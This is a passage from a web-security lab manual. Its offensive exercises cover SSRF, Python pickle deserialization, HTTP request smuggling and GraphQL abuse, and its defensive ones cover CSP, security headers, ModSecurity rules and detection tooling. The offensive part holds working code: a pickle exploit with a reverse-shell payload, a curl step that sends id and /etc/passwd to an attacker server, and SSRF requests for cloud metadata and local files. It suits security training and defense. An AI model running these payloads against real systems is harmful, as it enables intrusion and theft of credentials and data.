                          "innerHTML": "<script>alert('pp-xss')</script>"
                      }})
    print(f"  Response: {r.json()}")
    
    # Test 3: Nested constructor pollution
    print("\n=== Test 3: Constructor.prototype pollution ===")
    r = requests.post(f"{TARGET}/api/config",
                      json={"constructor": {"prototype": {"polluted": "true", "role": "admin"}}})
    print(f"  Response: {r.json()}")
    
    # Detection: check if Object.prototype has unexpected properties
    print("\n=== Verification ===")
    r = requests.post(f"{TARGET}/api/config",
                      json={"check": "status"})
    result = r.json()
    print(f"  Config: {json.dumps(result, indent=2)}")

if __name__ == '__main__':
    test_pollution_chain()
```

**Expected output:** Prototype pollution via `__proto__` property injection succeeds, with `{}.isAdmin` returning `true` after the merge.

---

### Exercise 7: SSRF and Deserialization Attacks

**Objective:** Exploit Server-Side Request Forgery to access internal services and cloud metadata. Exploit Python pickle deserialization for code execution.

#### Step 1: SSRF to Internal Services

```bash
# Basic SSRF — access localhost services
curl -s "http://10.8.0.10:3000/api/fetch-url?url=http://127.0.0.1:5000/health"
# Expected: Flask app health check response

# SSRF to Redis (if running)
curl -s "http://10.8.0.10:3000/api/fetch-url?url=http://127.0.0.1:6379/"

# SSRF to cloud metadata (simulated)
curl -s "http://10.8.0.10:3000/api/fetch-url?url=http://169.254.169.254/latest/meta-data/"
# In a real cloud environment, this returns instance metadata

# SSRF with file:// protocol
curl -s "http://10.8.0.10:3000/api/fetch-url?url=file:///etc/passwd"

# SSRF to internal network scanning
for port in 22 80 443 3000 3306 5000 5432 6379 8080 8180 9200; do
  result=$(curl -s --max-time 3 \
    "http://10.8.0.10:3000/api/fetch-url?url=http://127.0.0.1:$port/" 2>/dev/null)
  if [ -n "$result" ] && ! echo "$result" | grep -q "error"; then
    echo "[OPEN] Port $port: $(echo "$result" | head -c 100)"
  fi
done
```

#### Step 2: SSRF via Flask Webhook Endpoint

```bash
# Flask SSRF with POST capability (more dangerous — can hit IMDSv2)
curl -s -X POST http://10.8.0.10:5000/api/webhook-test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:3000/api/user-data"}'

# Gopher protocol for Redis command injection (if gopher:// is supported)
curl -s -X POST http://10.8.0.10:5000/api/webhook-test \
  -H "Content-Type: application/json" \
  -d '{"url":"gopher://127.0.0.1:6379/_SET%20ssrf-test%20pwned%0d%0a"}'
```

#### Step 3: Python Pickle Deserialization RCE

```python
#!/usr/bin/env python3
"""pickle_exploit.py — Exploit Python pickle deserialization for code execution."""

import pickle
import base64
import requests
import os

class PickleExploit:
    """
    pickle.loads() calls __reduce__() during deserialization,
    which can return a callable + arguments to execute.
    """
    
    @staticmethod
    def generate_payload(command):
        """Generate a pickle payload that executes a shell command."""
        
        class Exploit:
            def __reduce__(self):
                return (os.system, (command,))
        
        payload = pickle.dumps(Exploit())
        return payload
    
    @staticmethod
    def generate_reverse_shell_payload(attacker_ip, attacker_port):
        """Generate a pickle payload for a reverse shell."""
        
        class ReverseShell:
            def __reduce__(self):
                import subprocess
                cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
                return (os.system, (cmd,))
        
        return pickle.dumps(ReverseShell())
    
    @staticmethod
    def generate_data_exfil_payload(attacker_url):
        """Generate a pickle payload that exfiltrates system info."""
        
        class DataExfil:
            def __reduce__(self):
                cmd = f"curl -X POST {attacker_url}/pickle-rce -d \"$(id; hostname; cat /etc/passwd | head -5)\""
                return (os.system, (cmd,))
        
        return pickle.dumps(DataExfil())

def exploit_flask_pickle(target_url, payload_bytes):
    """Send pickle payload to the Flask deserialization endpoint."""
    
    # Method 1: raw bytes
    print("[*] Sending raw pickle payload...")
    r = requests.post(f"{target_url}/api/deserialize",
                      data=payload_bytes,
                      headers={"Content-Type": "application/octet-stream"},
                      timeout=10)
    print(f"  Status: {r.status_code}")
    print(f"  Response: {r.text[:300]}")
    
    # Method 2: base64-encoded
    print("\n[*] Sending base64-encoded pickle payload...")
    b64_payload = base64.b64encode(payload_bytes)
    r = requests.post(f"{target_url}/api/deserialize",
                      data=b64_payload,
                      headers={"Content-Type": "application/base64-pickle"},
                      timeout=10)
    print(f"  Status: {r.status_code}")
    print(f"  Response: {r.text[:300]}")

if __name__ == '__main__':
    target = "http://10.8.0.10:5000"
    attacker = "http://10.8.0.20:8080"
    
    # Command execution payload
    print("=== Pickle Deserialization RCE ===\n")
    
    # Benign PoC: create a file to prove execution
    payload = PickleExploit.generate_payload("id > /tmp/pickle_rce_proof.txt")
    print(f"Payload size: {len(payload)} bytes")
    print(f"Payload (hex): {payload.hex()[:100]}...")
    
    exploit_flask_pickle(target, payload)
    
    # Data exfiltration payload
    print("\n=== Data Exfiltration via Pickle ===\n")
    exfil_payload = PickleExploit.generate_data_exfil_payload(attacker)
    exploit_flask_pickle(target, exfil_payload)
    
    print("\n[*] Check /tmp/pickle_rce_proof.txt on target")
    print(f"[*] Check attacker server logs for exfiltrated data")
```

```bash
python3 pickle_exploit.py
# Then verify on the target:
ssh root@10.8.0.10 "cat /tmp/pickle_rce_proof.txt"
```

**Expected output:** SSRF reads internal service responses including localhost APIs. Pickle deserialization executes system commands, proven by file creation and data exfiltration to attacker server.

---

### Exercise 8: HTTP Request Smuggling and GraphQL Abuse

**Objective:** Detect and exploit HTTP request smuggling in proxy configurations. Abuse GraphQL introspection and batch queries.

#### Step 1: HTTP Request Smuggling Detection

```python
#!/usr/bin/env python3
"""smuggling_detector.py — Detect CL.TE and TE.CL request smuggling vulnerabilities."""

import socket
import time

def send_raw_http(host, port, raw_request, timeout=5):
    """Send raw HTTP bytes and read the response."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, port))
    s.sendall(raw_request)
    
    response = b""
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            response += data
    except socket.timeout:
        pass
    finally:
        s.close()
    return response

def test_cl_te(host, port):
    """Test CL.TE smuggling: front-end uses CL, back-end uses TE."""
    print("\n=== Testing CL.TE Smuggling ===")
    
    # Timing-based detection: if the back-end interprets TE,
    # the smuggled portion will cause a delay or error on the next request
    
    # Normal request for baseline timing
    normal = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"\r\n"
        f"x=1\r\n"
    ).encode()
    
    start = time.time()
    resp = send_raw_http(host, port, normal)
    baseline = time.time() - start
    print(f"  Baseline response time: {baseline:.3f}s")
    
    # CL.TE probe: CL says one size, TE says another
    # If vulnerable, the back-end reads TE=chunked and processes "0\r\n\r\n"
    # then treats "GPOST" as start of next request, which times out
    probe = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"1\r\n"
        f"Z\r\n"
        f"Q\r\n"  # Invalid chunk — should cause error if TE is processed
    ).encode()
    
    start = time.time()
    resp = send_raw_http(host, port, probe, timeout=10)
    probe_time = time.time() - start
    print(f"  CL.TE probe response time: {probe_time:.3f}s")
    
    if probe_time > baseline + 3:
        print(f"  [!] Potential CL.TE vulnerability — significant delay detected")
    else:
        print(f"  [OK] No obvious CL.TE vulnerability")

def test_te_cl(host, port):
    """Test TE.CL smuggling: front-end uses TE, back-end uses CL."""
    print("\n=== Testing TE.CL Smuggling ===")
    
    probe = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"X"  # This byte is read by CL but not TE
    ).encode()
    
    start = time.time()
    resp = send_raw_http(host, port, probe, timeout=10)
    probe_time = time.time() - start
    print(f"  TE.CL probe response time: {probe_time:.3f}s")
    print(f"  Response status: {resp[:50]}")

def test_te_obfuscation(host, port):
    """Test TE header obfuscation variants."""
    print("\n=== Testing TE Obfuscation ===")
    
    obfuscations = [
        "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\n ",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: xchunked",
        " Transfer-Encoding: chunked",
    ]
    
    for obs in obfuscations:
        print(f"\n  Testing: {repr(obs[:50])}")
        probe = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"{obs}\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        
        try:
            resp = send_raw_http(host, port, probe, timeout=5)
            status = resp.split(b'\r\n')[0] if resp else b"NO RESPONSE"
            print(f"    Response: {status.decode(errors='replace')}")
        except Exception as e:
            print(f"    Error: {e}")

if __name__ == '__main__':
    # Test against the WAF proxy (VM3) which fronts the Express app (VM1)
    host = "10.8.0.30"
    port = 80
    
    print(f"HTTP Request Smuggling Scanner — Target: {host}:{port}")
    test_cl_te(host, port)
    test_te_cl(host, port)
    test_te_obfuscation(host, port)
```

#### Step 2: GraphQL Introspection and Abuse

```bash
# Dump the full GraphQL schema via introspection
curl -s -X POST http://10.8.0.10:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind} args{name type{name}}}}mutationType{name fields{name}}queryType{name fields{name}}}}"}' \
  | python3 -m json.tool

# Expected: reveals User type with password_hash, api_key fields
# Expected: reveals AdminMutation with deleteUser, changeRole, resetPassword

# Exploit: query admin data without authorization
curl -s -X POST http://10.8.0.10:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ adminUsers { id username email role } }"}' \
  | python3 -m json.tool

# Batch query DoS — alias-based query amplification
BATCH_QUERY=$(python3 -c "
aliases = ' '.join([f'q{i}: adminUsers {{ username email }}' for i in range(100)])
print('{\"query\":\"{ ' + aliases + ' }\"}')")

curl -s -X POST http://10.8.0.10:3000/graphql \
  -H "Content-Type: application/json" \
  -d "$BATCH_QUERY" | python3 -c "import sys,json;d=json.load(sys.stdin);print(f'Aliases returned: {len(d.get(\"data\",{}))}')"
```

```python
#!/usr/bin/env python3
"""graphql_exploiter.py — GraphQL introspection and authorization bypass scanner."""

import requests
import json

class GraphQLExploiter:
    def __init__(self, endpoint):
        self.endpoint = endpoint
        self.schema = None
    
    def introspect(self):
        """Full schema introspection."""
        query = """
        {
          __schema {
            types {
              name
              kind
              fields {
                name
                type { name kind ofType { name } }
                args { name type { name } }
              }
            }
            mutationType { name fields { name args { name } } }
            queryType { name fields { name args { name } } }
          }
        }
        """
        r = requests.post(self.endpoint, json={"query": query}, timeout=10)
        self.schema = r.json()
        return self.schema
    
    def find_sensitive_fields(self):
        """Identify potentially sensitive fields in the schema."""
        sensitive_keywords = [
            'password', 'secret', 'token', 'key', 'hash',
            'admin', 'credential', 'private', 'internal'
        ]
        
        findings = []
        if not self.schema:
            self.introspect()
        
        for type_info in self.schema.get('data', {}).get('__schema', {}).get('types', []):
            for field in (type_info.get('fields') or []):
                field_name = field.get('name', '').lower()
                if any(kw in field_name for kw in sensitive_keywords):
                    findings.append({
                        'type': type_info['name'],
                        'field': field['name'],
                        'field_type': field.get('type', {}).get('name', 'unknown')
                    })
        
        return findings
    
    def find_admin_mutations(self):
        """Find administrative mutations."""
        mutations = []
        if not self.schema:
            self.introspect()
        
        mutation_type = self.schema.get('data', {}).get('__schema', {}).get('mutationType')
        if mutation_type:
            for field in (mutation_type.get('fields') or []):
                mutations.append({
                    'name': field['name'],
                    'args': [a['name'] for a in (field.get('args') or [])]
                })
        return mutations
    
    def test_auth_bypass(self):
        """Test if sensitive queries are accessible without authentication."""
        test_queries = [
            ("adminUsers", '{ adminUsers { id username email role } }'),
            ("allUsers", '{ users { id username password_hash } }'),
        ]
        
        results = []
        for name, query in test_queries:
            r = requests.post(self.endpoint, json={"query": query}, timeout=10)
            data = r.json()
            has_data = bool(data.get('data', {}).get(name.split('{')[0].strip()))
            results.append({
                'query': name,
                'accessible': has_data,
                'response': data
            })
        return results

if __name__ == '__main__':
    exploiter = GraphQLExploiter("http://10.8.0.10:3000/graphql")
    
    print("=== GraphQL Schema Introspection ===")
    schema = exploiter.introspect()
    
    print("\n=== Sensitive Fields ===")
    for f in exploiter.find_sensitive_fields():
        print(f"  [!] {f['type']}.{f['field']} ({f['field_type']})")
    
    print("\n=== Admin Mutations ===")
    for m in exploiter.find_admin_mutations():
        print(f"  [!] {m['name']}({', '.join(m['args'])})")
    
    print("\n=== Authorization Bypass Tests ===")
    for r in exploiter.test_auth_bypass():
        status = "ACCESSIBLE" if r['accessible'] else "BLOCKED"
        print(f"  [{status}] {r['query']}")
```

**Expected output:** GraphQL introspection reveals sensitive fields (password_hash, api_key) and admin mutations. Unauthorized queries return data without authentication checks.

---

## PART B: DEFENSIVE — Protection Systems

### Exercise 9: Content Security Policy Deployment

**Objective:** Deploy a progressive CSP from report-only to enforcement, with nonce-based script control and strict-dynamic.

#### Step 1: CSP Report-Only Baseline

```javascript
// csp_middleware.js — Progressive CSP deployment for Express

const crypto = require('crypto');

// Phase 1: Report-Only — collect violations without blocking
function cspReportOnly(req, res, next) {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;
  
  res.setHeader('Content-Security-Policy-Report-Only',
    `default-src 'self'; ` +
    `script-src 'self' 'unsafe-inline' 'unsafe-eval'; ` +
    `style-src 'self' 'unsafe-inline'; ` +
    `img-src 'self' data: https:; ` +
    `font-src 'self'; ` +
    `connect-src 'self'; ` +
    `frame-ancestors 'none'; ` +
    `report-uri /csp-report`
  );
  next();
}

// Phase 2: Nonce-based scripts (report-only while testing)
function cspNonceReportOnly(req, res, next) {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;
  
  res.setHeader('Content-Security-Policy-Report-Only',
    `default-src 'self'; ` +
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'; ` +
    `style-src 'self' 'unsafe-inline'; ` +
    `object-src 'none'; ` +
    `base-uri 'self'; ` +
    `frame-ancestors 'none'; ` +
    `form-action 'self'; ` +
    `report-uri /csp-report`
  );
  next();
}

// Phase 3: Enforce — active blocking
function cspEnforce(req, res, next) {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;
  
  res.setHeader('Content-Security-Policy',
    `default-src 'self'; ` +
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'; ` +
    `style-src 'self' 'unsafe-inline'; ` +
    `object-src 'none'; ` +
    `base-uri 'self'; ` +
    `frame-ancestors 'none'; ` +
    `form-action 'self'; ` +
    `require-trusted-types-for 'script'; ` +
    `report-uri /csp-report`
  );
  next();
}

// CSP violation report handler
function cspReportHandler(req, res) {
  const report = req.body['csp-report'] || req.body;
  
  const classified = classifyViolation(report);
  console.log(`[CSP ${classified.severity}] ${classified.directive}: ${classified.blocked}`);
  
  // High-fidelity XSS indicators
  if (report['violated-directive']?.startsWith('script-src') &&
      report['blocked-uri'] &&
      !report['blocked-uri'].startsWith("'self'")) {
    console.log(`[SECURITY ALERT] External script blocked: ${report['blocked-uri']}`);
    // Send to SIEM
  }
  
  res.sendStatus(204);
}

function classifyViolation(report) {
  const directive = report['violated-directive'] || 'unknown';
  const blocked = report['blocked-uri'] || 'unknown';
  let severity = 'INFO';
  
  if (directive.startsWith('script-src')) severity = 'HIGH';
  if (blocked.includes('eval') || blocked.includes('inline')) severity = 'MEDIUM';
  if (directive.includes('frame-ancestors')) severity = 'MEDIUM';
  
  return { severity, directive, blocked };
}

module.exports = { cspReportOnly, cspNonceReportOnly, cspEnforce, cspReportHandler };
```

#### Step 2: Trusted Types Implementation

```javascript
// trusted_types_setup.js — Enforce Trusted Types for DOM XSS prevention

// Client-side Trusted Types policy
const trustedTypesScript = `
// Create the sanitizer policy — the only way to write HTML to DOM sinks
if (window.trustedTypes && trustedTypes.createPolicy) {
  // Default policy — catches all uncovered sinks
  trustedTypes.createPolicy('default', {
    createHTML: (input) => {
      // Use DOMPurify for sanitization
      if (typeof DOMPurify !== 'undefined') {
        return DOMPurify.sanitize(input, {
          ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
          ALLOWED_ATTR: ['href', 'class'],
        });
      }
      // Fallback: strip all HTML
      const div = document.createElement('div');
      div.textContent = input;
      return div.innerHTML;
    },
    createScriptURL: (input) => {
      const url = new URL(input, location.origin);
      if (url.origin !== location.origin) {
        throw new TypeError('Cross-origin script URL blocked by Trusted Types');
      }
      return url.toString();
    },
    createScript: (input) => {
      throw new TypeError('Dynamic script creation blocked by Trusted Types');
    }
  });
  
  console.log('[TT] Trusted Types default policy registered');
}
`;

module.exports = { trustedTypesScript };
```

#### Step 3: Verify CSP Blocks XSS

```bash
# Test XSS against the CSP-protected endpoint
# First, enable CSP enforcement on the WAF proxy

# Attempt reflected XSS
curl -s -D- "http://10.8.0.30/search?q=<script>alert(1)</script>" | grep -i "content-security"
# Expected: CSP header present → browser blocks inline script execution

# Attempt event handler XSS
curl -s -D- "http://10.8.0.30/search?q=<img+src=x+onerror=alert(1)>" | grep -i "content-security"
# The HTML is reflected, but CSP blocks the inline event handler

# Check CSP violation reports
curl -s http://10.8.0.30:9200/web-security-*/_search \
  -H "Content-Type: application/json" \
  -d '{"query":{"match":{"type":"csp-report"}}}' | python3 -m json.tool
```

**Expected output:** CSP in report-only mode generates violation reports. In enforcement mode, XSS payloads are reflected but execution is blocked by the browser.

---

### Exercise 10: Security Headers and WAF Deployment

**Objective:** Deploy comprehensive security headers, configure ModSecurity CRS, and create custom WAF rules.

#### Step 1: Full Security Headers Stack

```nginx
# /etc/nginx/conf.d/security-headers.conf
# Apply to all server blocks: include /etc/nginx/conf.d/security-headers.conf;

# Per-request nonce generation via nginx variable
set $csp_nonce $request_id;

# === Transport Security ===
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

# === Content Security ===
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$csp_nonce' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'; report-uri /csp-report" always;

# === MIME Security ===
add_header X-Content-Type-Options "nosniff" always;

# === Framing Protection ===
add_header X-Frame-Options "DENY" always;

# === Referrer Control ===
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# === Feature Restriction ===
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=()" always;

# === Cross-Origin Isolation (Spectre mitigation) ===
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Embedder-Policy "require-corp" always;
add_header Cross-Origin-Resource-Policy "same-origin" always;

# === DNS Prefetch Control ===
add_header X-DNS-Prefetch-Control "off" always;

# === Legacy Plugin Protection ===
add_header X-Permitted-Cross-Domain-Policies "none" always;
```

```bash
# Deploy and verify
cp security-headers.conf /etc/nginx/conf.d/
nginx -t && systemctl reload nginx

# Audit all headers
curl -s -D- http://10.8.0.30/ -o/dev/null | grep -E "^(Strict|Content-Security|X-|Referrer|Permissions|Cross-Origin)"
```

#### Step 2: Custom ModSecurity Rules

```bash
cat > /etc/modsecurity/custom-rules.conf << 'MODSEC'
# ============================================================
# Custom WAF Rules for Lab Detection
# ============================================================

# Rule 1: Block GraphQL introspection in production
SecRule REQUEST_BODY "@rx __schema|__type\s*\{|introspectionQuery" \
    "id:100001,phase:2,block,\
    msg:'GraphQL introspection attempt blocked',\
    severity:'WARNING',tag:'CUSTOM/GRAPHQL'"

# Rule 2: Detect deserialization payloads
SecRule REQUEST_BODY "@rx rO0AB|aced0005|O:\d+:|a:\d+:{" \
    "id:100002,phase:2,block,\
    msg:'Potential deserialization payload detected',\
    severity:'CRITICAL',tag:'CUSTOM/DESERIALIZATION'"

# Rule 3: Block SSRF to metadata endpoints
SecRule ARGS "@rx 169\.254\.169\.254|metadata\.google|metadata\.azure" \
    "id:100003,phase:2,block,\
    msg:'SSRF attempt to cloud metadata endpoint',\
    severity:'CRITICAL',tag:'CUSTOM/SSRF'"

# Rule 4: Detect prototype pollution attempts
SecRule REQUEST_BODY "@rx __proto__|constructor\[.prototype|Object\.prototype" \
    "id:100004,phase:2,block,\
    msg:'Prototype pollution attempt detected',\
    severity:'HIGH',tag:'CUSTOM/PROTOPOLLUTION'"

# Rule 5: Detect JWT none algorithm
SecRule REQUEST_HEADERS:Authorization "@rx Bearer\s+eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.$" \
    "id:100005,phase:1,block,\
    msg:'JWT with empty signature (possible alg:none)',\
    severity:'CRITICAL',tag:'CUSTOM/JWT'"

# Rule 6: Rate limit auth endpoints
SecRule REQUEST_URI "@beginsWith /api/auth" \
    "id:100006,phase:1,pass,nolog,\
    setvar:ip.auth_attempts=+1,\
    expirevar:ip.auth_attempts=60"
SecRule IP:AUTH_ATTEMPTS "@gt 10" \
    "id:100007,phase:1,block,\
    msg:'Auth endpoint rate limit exceeded',\
    severity:'WARNING',tag:'CUSTOM/RATELIMIT'"

# Rule 7: Detect HTTP request smuggling indicators
SecRule REQUEST_HEADERS "@rx Content-Length.*Content-Length" \
    "id:100008,phase:1,block,\
    msg:'Duplicate Content-Length header (smuggling indicator)',\
    severity:'CRITICAL',tag:'CUSTOM/SMUGGLING'"

# Rule 8: Block suspicious Origin headers for CORS abuse
SecRule REQUEST_HEADERS:Origin "@rx ^https?://(.*\.)?(evil|attacker|malicious)\." \
    "id:100009,phase:1,block,\
    msg:'Suspicious CORS Origin header',\
    severity:'HIGH',tag:'CUSTOM/CORS'"
MODSEC

# Include custom rules in ModSecurity config
echo 'Include /etc/modsecurity/custom-rules.conf' >> /etc/nginx/modsecurity.conf
nginx -t && systemctl reload nginx

# Test that rules fire
echo "=== Testing WAF rules ==="

# Test: GraphQL introspection blocked
echo -n "GraphQL introspection: "
curl -s -o /dev/null -w "%{http_code}" -X POST http://10.8.0.30/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
echo

# Test: SSRF blocked
echo -n "SSRF to metadata: "
curl -s -o /dev/null -w "%{http_code}" "http://10.8.0.30/api/fetch-url?url=http://169.254.169.254/"
echo

# Test: Prototype pollution blocked
echo -n "Proto pollution: "
curl -s -o /dev/null -w "%{http_code}" -X POST http://10.8.0.30/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
echo

# Expected: 403 for all blocked requests
```

#### Step 3: Security Header Audit Script

```python
#!/usr/bin/env python3
"""security_headers_audit.py — Comprehensive security header assessment."""

import requests
import json
import sys

class SecurityHeaderAudit:
    REQUIRED_HEADERS = {
        'Strict-Transport-Security': {
            'required': True,
            'check': lambda v: 'max-age=' in v and int(v.split('max-age=')[1].split(';')[0].strip()) >= 31536000,
            'recommendation': 'max-age=63072000; includeSubDomains; preload'
        },
        'Content-Security-Policy': {
            'required': True,
            'check': lambda v: "'unsafe-inline'" not in v or "'nonce-" in v,
            'recommendation': "script-src 'self' 'nonce-...' 'strict-dynamic'; object-src 'none'; base-uri 'self'"
        },
        'X-Content-Type-Options': {
            'required': True,
            'check': lambda v: v.lower() == 'nosniff',
            'recommendation': 'nosniff'
        },
        'X-Frame-Options': {
            'required': True,
            'check': lambda v: v.upper() in ('DENY', 'SAMEORIGIN'),
            'recommendation': 'DENY'
        },
        'Referrer-Policy': {
            'required': True,
            'check': lambda v: v in ('strict-origin-when-cross-origin', 'no-referrer', 'same-origin'),
            'recommendation': 'strict-origin-when-cross-origin'
        },
        'Permissions-Policy': {
            'required': True,
            'check': lambda v: 'camera=()' in v,
            'recommendation': 'camera=(), microphone=(), geolocation=(), payment=()'
        },
        'Cross-Origin-Opener-Policy': {
            'required': False,
            'check': lambda v: v == 'same-origin',
            'recommendation': 'same-origin'
        },
        'Cross-Origin-Embedder-Policy': {
            'required': False,
            'check': lambda v: v == 'require-corp',
            'recommendation': 'require-corp'
        },
    }
    
    DANGEROUS_HEADERS = [
        'Server',
        'X-Powered-By',
        'X-AspNet-Version',
        'X-AspNetMvc-Version',
    ]
    
    def __init__(self, url):
        self.url = url
        self.results = {}
    
    def audit(self):
        r = requests.get(self.url, timeout=10, verify=False)
        headers = dict(r.headers)
        
        print(f"{'='*60}")
        print(f"Security Header Audit: {self.url}")
        print(f"{'='*60}\n")
        
        score = 0
        max_score = 0
        
        for header_name, config in self.REQUIRED_HEADERS.items():
            max_score += 10
            value = headers.get(header_name, '')
            
            if not value:
                status = "MISSING"
                emoji = "FAIL"
                points = 0
            elif config['check'](value):
                status = "GOOD"
                emoji = "PASS"
                points = 10
            else:
                status = "WEAK"
                emoji = "WARN"
                points = 5
            
            score += points
            print(f"  [{emoji}] {header_name}")
            if value:
                print(f"         Current: {value[:80]}")
            if status != "GOOD":
                print(f"         Recommended: {config['recommendation']}")
            print()
        
        # Check for information leakage headers
        print("--- Information Leakage ---\n")
        for header in self.DANGEROUS_HEADERS:
            value = headers.get(header, '')
            if value:
                print(f"  [WARN] {header}: {value} — REMOVE this header")
            else:
                print(f"  [PASS] {header}: not present")
        
        # CSP deep analysis
        csp = headers.get('Content-Security-Policy', '')
        if csp:
            print("\n--- CSP Deep Analysis ---\n")
            if "'unsafe-inline'" in csp and "'nonce-" not in csp:
                print("  [FAIL] unsafe-inline without nonce — XSS protection defeated")
            if "'unsafe-eval'" in csp:
                print("  [WARN] unsafe-eval present — eval() and related allowed")
            if 'object-src' not in csp:
                print("  [WARN] object-src not set — plugin-based attacks possible")
            if 'base-uri' not in csp:
                print("  [WARN] base-uri not set — base tag hijacking possible")
            if 'frame-ancestors' not in csp:
                print("  [WARN] frame-ancestors not set — clickjacking possible")
            if "'strict-dynamic'" in csp:
                print("  [PASS] strict-dynamic present — trusted loader model")
            if 'report-uri' in csp or 'report-to' in csp:
                print("  [PASS] Reporting configured")
        
        print(f"\n{'='*60}")
        print(f"Score: {score}/{max_score} ({score/max_score*100:.0f}%)")
        grade = 'A+' if score >= 95 else 'A' if score >= 85 else 'B' if score >= 70 else 'C' if score >= 50 else 'F'
        print(f"Grade: {grade}")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://10.8.0.30/"
    audit = SecurityHeaderAudit(url)
    audit.audit()
```

```bash
# Audit the vulnerable app (before headers)
python3 security_headers_audit.py http://10.8.0.10:3000/
# Expected: Low score — most headers missing

# Audit the WAF-protected app (after headers)
python3 security_headers_audit.py http://10.8.0.30/
# Expected: High score — all headers present
```

**Expected output:** Vulnerable app scores F (most headers missing). WAF-protected app scores A or A+ with complete header stack. Custom WAF rules block introspection, SSRF, prototype pollution, and smuggling attempts.

---

### Exercise 11: Detection Engineering for Web Attacks

**Objective:** Deploy Sigma rules, YARA web shell signatures, and CSP violation monitoring for real-time web attack detection.

#### Step 1: Deploy Sigma Detection Rules

```bash
# Convert Sigma rules to Elasticsearch queries
cd /opt/sigma-rules

# Convert all rules
for rule in *.yml; do
  echo "=== Converting $rule ==="
  sigma convert -t elasticsearch -p ecs_windows "$rule" 2>/dev/null
  echo
done

# Create an Elasticsearch watcher for critical alerts
curl -X PUT "http://10.8.0.30:9200/_watcher/watch/xss_detection" \
  -H "Content-Type: application/json" \
  -d '{
    "trigger": { "schedule": { "interval": "30s" } },
    "input": {
      "search": {
        "request": {
          "indices": ["web-security-*"],
          "body": {
            "query": {
              "bool": {
                "must": [
                  { "range": { "@timestamp": { "gte": "now-1m" } } },
                  { "bool": {
                    "should": [
                      { "match_phrase": { "request": "<script" } },
                      { "match_phrase": { "request": "javascript:" } },
                      { "match_phrase": { "request": "onerror=" } }
                    ]
                  }}
                ]
              }
            }
          }
        }
      }
    },
    "condition": { "compare": { "ctx.payload.hits.total": { "gt": 0 } } },
    "actions": {
      "log": {
        "logging": { "text": "XSS attempt detected: {{ctx.payload.hits.total}} events" }
      }
    }
  }' 2>/dev/null || echo "[!] Watcher API may need X-Pack"
```

#### Step 2: YARA Web Shell Scanner

```bash
# Scan web directories for web shells
yara -r /opt/yara-rules/webshells.yar /opt/vuln-apps/ 2>/dev/null

# Create a continuous scanning service
cat > /opt/yara-rules/scan_webshells.sh << 'SCAN'
#!/bin/bash
# Continuous web shell scanner
WEB_DIRS="/opt/vuln-apps /var/www /srv/http"
LOG="/var/log/yara-webshell.log"

while true; do
  for dir in $WEB_DIRS; do
    [ -d "$dir" ] || continue
    results=$(yara -r /opt/yara-rules/webshells.yar "$dir" 2>/dev/null)
    if [ -n "$results" ]; then
      echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] ALERT: Web shell detected" >> "$LOG"
      echo "$results" >> "$LOG"
    fi
  done
  sleep 300  # Scan every 5 minutes
done
SCAN
chmod +x /opt/yara-rules/scan_webshells.sh
```

#### Step 3: CSP Violation Report Analyzer

```python
#!/usr/bin/env python3
"""csp_report_analyzer.py — Analyze CSP violation reports for attack indicators."""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sys
from collections import defaultdict
from datetime import datetime

class CSPReportCollector(BaseHTTPRequestHandler):
    reports = []
    stats = defaultdict(int)
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        try:
            data = json.loads(body)
            report = data.get('csp-report', data)
            
            # Extract key fields
            entry = {
                'timestamp': datetime.utcnow().isoformat() + 'Z',
                'document_uri': report.get('document-uri', ''),
                'violated_directive': report.get('violated-directive', ''),
                'blocked_uri': report.get('blocked-uri', ''),
                'source_file': report.get('source-file', ''),
                'line_number': report.get('line-number', 0),
                'client_ip': self.client_address[0],
            }
            
